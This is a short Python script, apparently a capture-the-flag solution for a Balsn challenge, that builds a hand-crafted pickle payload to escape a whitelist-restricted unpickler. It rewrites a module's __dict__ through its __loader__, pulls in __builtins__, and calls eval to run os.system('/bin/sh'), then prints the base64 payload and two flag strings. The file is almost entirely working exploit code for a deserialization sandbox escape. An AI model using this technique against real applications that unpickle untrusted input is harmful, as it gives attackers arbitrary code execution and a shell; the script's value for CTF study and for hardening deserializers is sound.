#!/usr/bin/python3
from pickle import *
import sys
import struct
import base64

sys.path.append('pyshv2')
import securePickle
securePickle.whitelist.append('structs')

def flatten(x, res=None):
    if res is None:
        res = bytearray()
    if isinstance(x, bytes):
        res += x
    else:
        for r in x:
            flatten(r, res)
    return res

def put(x):
    return [BINPUT, struct.pack('<B', x)]

def get(x):
    return [BINGET, struct.pack('<B', x)]

def structs(x):
    return [GLOBAL, b'structs\n', x.encode(), b'\n']

def pstr(x):
    x = x.encode('utf-8', 'surrogatepass')
    return [BINUNICODE, struct.pack('<I', len(x)), x]

def pdict(*x):
    return [MARK, x, DICT]

def ptuple(*x):
    return [MARK, x, TUPLE]

data = [
    PROTO, b'\x03',
    # set structs.__loader__'s __dict__ to structs.__dict__
    structs('__loader__'),
    ptuple(NONE, pdict(pstr('__dict__'), structs('__dict__'))), BUILD,
    # add everything in __builtins__ to structs.__loader__ (and to structs)
    ptuple(NONE, structs('__builtins__')), BUILD,
    structs('eval'),
    ptuple(pstr('__import__("os").system("/bin/sh")')), REDUCE,
    STOP
]

payload = base64.b64encode(flatten(data))
print(payload.decode())
print(securePickle.loads(flatten(data)))

# Balsn{CD_sP33duP_eVe3y7h1nG__Wh0_c4r3s_Th3_c0dE?}
# Balsn{pY7h0n1dae_ObJ3c7}
